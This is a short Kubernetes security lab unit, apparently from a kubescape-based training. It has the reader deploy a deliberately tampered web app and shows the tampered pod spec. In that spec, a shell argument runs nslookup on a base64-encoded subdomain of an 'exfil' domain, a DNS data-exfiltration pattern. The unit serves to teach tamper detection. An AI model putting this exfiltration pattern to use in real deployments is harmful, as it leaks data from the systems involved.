---
kind: unit

title: Use the Bill of Behaviour

name: bob-use
---


Now with tampering
## 3 deploy artefact 


```sh
cd traces/kubescape-verify/attacks/webapp_t/
chmod +x setup.sh
./setup.sh
```


if you deployed the tampered one, notice

```
    - args:
      - /bin/sh
      - -c
      - nslookup NjQgYnl0ZXMgZnJvbSAxNzIuMTYuMC4yOiBpY21wX3NlcT0zIHR0bD02MyB0aW1lPTAuNDUzIG1z.exfil.k8sstormcenter.com
        > /dev/null 2>&1
      path: /bin/sh
```
